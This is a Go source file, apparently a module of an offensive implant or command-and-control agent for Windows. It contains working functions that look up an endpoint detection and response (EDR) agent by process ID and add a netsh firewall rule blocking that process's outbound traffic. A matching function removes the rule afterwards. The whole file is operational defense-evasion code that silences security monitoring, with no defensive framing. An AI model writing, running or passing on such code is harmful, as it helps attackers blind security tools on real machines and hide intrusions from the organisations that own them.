//go:build windows

package agent

import (
	"fmt"
	"strings"

	"golang.org/x/sys/windows"
)

// edrSilence blocks outbound connections from a target process (EDR agent)
// using a Windows Firewall rule added via netsh advfirewall (LOLBin approach).
// Requires administrator privileges. First resolves the process path from PID.
func edrSilence(pidStr string) string {
	pid, err := parseUint32(strings.TrimSpace(pidStr))
	if err != nil {
		return "[-] invalid PID: " + err.Error()
	}

	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return fmt.Sprintf("[-] OpenProcess(%d): %v", pid, err)
	}
	defer windows.CloseHandle(hProc)

	var buf [windows.MAX_PATH]uint16
	size := uint32(windows.MAX_PATH)
	if err := windows.QueryFullProcessImageName(hProc, 0, &buf[0], &size); err != nil {
		return fmt.Sprintf("[-] QueryFullProcessImageName: %v", err)
	}
	procPath := windows.UTF16ToString(buf[:size])

	// Add outbound block rule via netsh advfirewall
	ruleName := fmt.Sprintf("EDRSilence_%d", pid)
	cmd := fmt.Sprintf(`netsh advfirewall firewall add rule name="%s" dir=out action=block program="%s" enable=yes`,
		ruleName, procPath)
	out, _ := runShell(cmd)
	return fmt.Sprintf("[+] WFP block added for PID %d (%s)\n%s", pid, procPath, out)
}

// edrSilenceRemove removes the firewall rule previously added by edrSilence.
func edrSilenceRemove(pidStr string) string {
	pid := strings.TrimSpace(pidStr)
	ruleName := fmt.Sprintf("EDRSilence_%s", pid)
	cmd := fmt.Sprintf(`netsh advfirewall firewall delete rule name="%s"`, ruleName)
	out, _ := runShell(cmd)
	return fmt.Sprintf("[+] WFP block removed for PID %s\n%s", pid, out)
}

// parseUint32 is a local helper to parse a uint32 from string.
func parseUint32(s string) (uint32, error) {
	var v uint64
	_, err := fmt.Sscanf(s, "%d", &v)
	if err != nil {
		return 0, err
	}
	return uint32(v), nil
}

